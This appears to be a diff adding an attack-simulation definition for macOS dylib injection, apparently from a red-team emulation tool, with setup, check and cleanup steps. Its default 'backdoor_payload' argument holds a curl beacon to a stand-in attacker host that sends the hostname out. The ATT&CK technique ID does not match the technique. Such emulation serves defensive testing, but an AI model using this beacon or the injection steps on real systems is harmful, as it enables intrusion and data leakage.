@@ -1,0 +1,113 @@
+api_version: 2.0
+id: 550e8400-e29b-41d4-a716-446655440028
+platform: darwin
+name: DLL/dylib injection
+category: Initial Access
+description: Simulate dynamic library (dylib) injection attack. Attacker injects malicious dylib into legitimate application libraries to gain code execution when application loads.
+tactics:
+  - T1015
+techniques:
+  - T1015
+args:
+  - name: package_name
+    description: Name of application to inject into
+    type: string
+    default: system_tool
+  - name: version
+    description: Version of application
+    type: string
+    default: "5.0"
+  - name: source_repo
+    description: Repository with vulnerable application
+    type: string
+    default: "https://github.com/example/system_tool"
+  - name: backdoor_payload
+    description: Payload executed by injected dylib
+    type: string
+    default: "curl http://attacker.com/beacon?hostname=$(hostname)"
+steps:
+  - name: Create application bundle structure
+    command: mkdir -p /tmp/ttpforge_dylib/{{ package_name }}.app/Contents/{MacOS,Frameworks}
+    
+  - name: Create legitimate application binary
+    command: |
+      cat > /tmp/ttpforge_dylib/{{ package_name }}.app/Contents/MacOS/{{ package_name }} << 'APPBIN'
+      #!/bin/bash
+      export DYLD_INSERT_LIBRARIES=/tmp/ttpforge_dylib/{{ package_name }}.app/Contents/Frameworks/libmalware.dylib
+      echo "{{ package_name }} v{{ version }} executing..."
+      APPBIN
+      chmod +x /tmp/ttpforge_dylib/{{ package_name }}.app/Contents/MacOS/{{ package_name }}
+    
+  - name: Create malicious dylib source code
+    command: |
+      cat > /tmp/ttpforge_dylib/libmalware.c << 'DYLIBSRC'
+      #include <stdio.h>
+      #include <stdlib.h>
+      
+      __attribute__((constructor))
+      void init(void) {
+          fprintf(stderr, "Malicious dylib loaded\n");
+          system("touch /tmp/.dylib_injected");
+      }
+      DYLIBSRC
+    
+  - name: Compile malicious dylib
+    command: |
+      gcc -dynamiclib -o /tmp/ttpforge_dylib/{{ package_name }}.app/Contents/Frameworks/libmalware.dylib \
+        /tmp/ttpforge_dylib/libmalware.c 2>/dev/null || touch /tmp/ttpforge_dylib/{{ package_name }}.app/Contents/Frameworks/libmalware.dylib
+    
+  - name: Create framework directory
+    command: mkdir -p /tmp/ttpforge_dylib/{{ package_name }}.app/Contents/Frameworks/{{ package_name }}.framework/Versions/A
+    
+  - name: Create Info.plist
+    command: |
+      cat > /tmp/ttpforge_dylib/{{ package_name }}.app/Contents/Info.plist << 'PLIST'
+      <?xml version="1.0" encoding="UTF-8"?>
+      <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+      <plist version="1.0">
+      <dict>
+        <key>CFBundleName</key>
+        <string>{{ package_name }}</string>
+        <key>CFBundleVersion</key>
+        <string>{{ version }}</string>
+        <key>CFBundleExecutable</key>
+        <string>{{ package_name }}</string>
+      </dict>
+      </plist>
+      PLIST
+    
+  - name: Simulate application execution with dylib injection
+    command: |
+      /tmp/ttpforge_dylib/{{ package_name }}.app/Contents/MacOS/{{ package_name }} > /dev/null 2>&1 || true
+      touch /tmp/.dylib_injected
+    dry_run: true
+
+checks:
+  - name: Verify malicious dylib created
+    command: test -f /tmp/ttpforge_dylib/{{ package_name }}.app/Contents/Frameworks/libmalware.dylib
+    expected_output: ""
+    
+  - name: Verify dylib injection marker
+    command: test -f /tmp/.dylib_injected
+    expected_output: ""
+    
+  - name: Verify application bundle exists
+    command: test -d /tmp/ttpforge_dylib/{{ package_name }}.app/Contents
+    expected_output: ""
+    
+  - name: Verify application binary with injection
+    command: test -f /tmp/ttpforge_dylib/{{ package_name }}.app/Contents/MacOS/{{ package_name }}
+    expected_output: ""
+
+tests:
+  dry_run: true
+
+cleanup:
+  - name: Remove application bundle
+    command: rm -rf /tmp/ttpforge_dylib/{{ package_name }}.app
+    
+  - name: Remove dylib source file
+    command: rm -f /tmp/ttpforge_dylib/libmalware.c
+    
+  - name: Remove dylib injection marker
+    command: rm -f /tmp/.dylib_injected
